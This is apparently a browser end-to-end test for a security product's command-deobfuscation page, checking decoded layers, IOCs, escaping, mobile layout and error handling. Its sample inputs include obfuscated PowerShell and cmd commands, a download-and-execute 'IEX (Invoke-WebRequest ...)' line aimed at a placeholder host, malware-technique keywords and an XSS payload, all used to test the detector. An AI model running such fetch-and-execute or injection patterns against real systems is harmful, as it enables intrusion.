// Run against the synthetic loopback fixture, never against a deployment.
import {createRequire} from 'node:module';
import fs from 'node:fs';
import {gzipSync,deflateSync} from 'node:zlib';
import assert from 'node:assert/strict';
const require=createRequire(import.meta.url);
const {chromium}=require(process.env.NIVX_PLAYWRIGHT_PATH || 'playwright');
const browser=await chromium.launch({headless:true,executablePath:process.env.NIVX_CHROMIUM_PATH || undefined,args:['--no-sandbox','--disable-gpu','--disable-dev-shm-usage']});
try {
 const page=await browser.newPage({viewport:{width:1280,height:1000}});
 const errors=[];page.on('pageerror',e=>errors.push(e.message));
 const token=fs.readFileSync(process.env.NIVX_COMMAND_TEST_TOKEN_PATH,'utf8');
 await page.addInitScript(t=>{localStorage.setItem('nvx_token',t);localStorage.setItem('nvx_tenant','synthetic-a');},token);
 await page.goto('http://127.0.0.1:3197');
 const raw='  powershell -enc '+Buffer.from('Write-Output "hello"','utf16le').toString('base64')+'\n';
 await page.getByTestId('xdr-cmd-input').fill(raw);
 const request=page.waitForRequest(r=>r.url().endsWith('/api/analyze/command'));
 await page.getByTestId('xdr-cmd-analyze').click();
 assert.equal((await request).postDataJSON().input,raw);
 await page.getByTestId('xdr-cmd-result').waitFor();
 assert.match(await page.getByTestId('xdr-cmd-result').innerText(),/Canonical decoded evidence/);
 await page.getByText('Reproducible recipe', {exact:false}).click();
 assert.match(await page.getByTestId('xdr-cmd-result').innerText(),/utf-16-le/);
 await page.screenshot({path:process.env.NIVX_COMMAND_SCREENSHOT || '/tmp/command-desktop.png',fullPage:true});
 await page.setViewportSize({width:390,height:844});
 await page.screenshot({path:'/tmp/command-mobile.png',fullPage:true});
 assert.ok(await page.evaluate(()=>document.documentElement.scrollWidth <= window.innerWidth));
 // Compare actual API evidence to structured DOM, including every intermediate.
 const b64=s=>Buffer.from(s).toString('base64');
 const script='Write-Output "https://example.com/harmless.txt"';
 const samples=[
   "Write-Output (-join [char[]](104,101,108,108,111))",
   "$a='he'; $b='llo'; Write-Output ($a+$b)",
   "Write-Output (-join (111,98,107,107,104 | ForEach-Object {[char]($_ -bxor 7)}))",
   'cmd /v:on /c "set x=hello&&echo !x!"',
   "IEX (Invoke-WebRequest 'https://example.invalid/hello.ps1')",
   "Write-Output 'IEX DownloadString VirtualAlloc schtasks'",
   b64(gzipSync(Buffer.from(b64(Buffer.from(script,'utf16le'))))),
   b64(deflateSync(Buffer.from(script))),
   "('Write-' + ('Out' + 'put'))",
   'cmd /c ec^ho hello',
   'cmd /c echo hello ^& echo bye',
   "[Convert]::FromBase64String('"+b64(script)+"'); [Convert]::FromBase64String('"+b64('Write-Output "two"')+"')",
   b64(gzipSync(Buffer.from(script)).subarray(0,-5)),
   'powershell -enc '+Buffer.from('Write-Output "hi"','utf16le').toString('base64')+' ; echo tail',
   'Write-Output "http://[bad"',
   'AES decrypt $ciphertext with $key',
   'Write-Output "<img src=x onerror=alert(1)>"',
 ];
 for (const input of samples) {
   await page.getByTestId('xdr-cmd-input').fill(input);
   const response=page.waitForResponse(r=>r.url().endsWith('/api/analyze/command'));
   await page.getByTestId('xdr-cmd-analyze').click();
   const received=await response;
   assert.equal(received.status(),200);
   const report=await received.json();
   await page.getByTestId('xdr-cmd-result').waitFor();
   const result=page.getByTestId('xdr-cmd-result');
   await result.locator('details').evaluateAll(ds=>ds.forEach(d=>{if(!d.textContent.startsWith('Full evidence report'))d.open=true;}));
   const pres=await result.locator('pre').allTextContents();
   assert.ok(pres.includes(input),'exact original');
   assert.ok(pres.includes(report.final_recoverable.value),'final evidence');
   const rendered=await result.innerText();
   assert.ok(rendered.includes(report.decode_status.replaceAll('_',' ')));
   for(const c of report.candidates) {
     assert.ok(pres.includes(c.payload.value),'candidate payload');
     assert.ok(pres.includes(JSON.stringify(c.recipe,null,2)),'exact recipe');
     for(const l of c.layers) {
       assert.ok(pres.includes(l.input.value),'intermediate input');
       assert.ok(pres.includes(l.output),'intermediate output');
       assert.ok(rendered.includes(l.stage));
       assert.ok(rendered.includes(l.input_sha256));
       assert.ok(rendered.includes(l.output_sha256));
     }
   }
   const cells=await result.locator('td').allTextContents();
   for(const i of report.iocs) for(const v of [i.type,i.value,i.evidence_id]) assert.ok(cells.includes(v),'IOC '+v);
   for(const w of report.unresolved_portions) assert.ok(rendered.includes(w),'unresolved '+w);
   for(const b of report.behaviors) {
     assert.ok(rendered.includes(b.explanation));
     assert.ok(rendered.includes(b.kind.replaceAll('_',' ')));
     assert.ok(rendered.includes(`characters ${b.start}–${b.end}`));
   }
   assert.equal(await result.locator('img,script').count(),0,'evidence is inert escaped text');
   assert.ok(await page.evaluate(()=>document.documentElement.scrollWidth <= window.innerWidth));
 }
 console.log('PASS: 17 additional HTTP/browser cases; all layers, recipes, candidates, IOCs, limitations, inert text and mobile width');
 // Late response must not reappear after tenant change.
 let release; const gate=new Promise(resolve=>release=resolve);
 await page.route('**/api/analyze/command',async route=>{await gate;await route.continue();});
 await page.getByTestId('xdr-cmd-analyze').click();
 await page.evaluate(()=>window.switchSyntheticTenant());
 release();
 await page.waitForTimeout(600);
 assert.equal(await page.getByTestId('xdr-cmd-result').count(),0);
 assert.equal(await page.getByTestId('xdr-cmd-input').inputValue(),'');
 await page.unroute('**/api/analyze/command');
 await page.route('**/api/analyze/command', route=>route.fulfill({status:503,contentType:'application/json',body:JSON.stringify({detail:{code:'decode_unavailable',message:'Worker busy; retry shortly'}})}));
 await page.getByTestId('xdr-cmd-input').fill('whoami');
 await page.getByTestId('xdr-cmd-analyze').click();
 await page.getByTestId('xdr-cmd-error').waitFor();
 assert.match(await page.getByTestId('xdr-cmd-error').innerText(),/Worker busy/);
 await page.unroute('**/api/analyze/command');
 await page.evaluate(()=>localStorage.setItem('nvx_token','invalid'));
 await page.getByTestId('xdr-cmd-input').fill('whoami');
 await page.getByTestId('xdr-cmd-analyze').click();
 await page.waitForFunction(()=>localStorage.getItem('nvx_token') === null);
 assert.equal(await page.getByTestId('xdr-cmd-result').count(),0);
 assert.deepEqual(errors,[]);
 console.log('PASS: actual page → authenticated HTTP → worker → rendered evidence; exact input, recipe, mobile, tenant cancellation and 401');
} finally {await browser.close();}
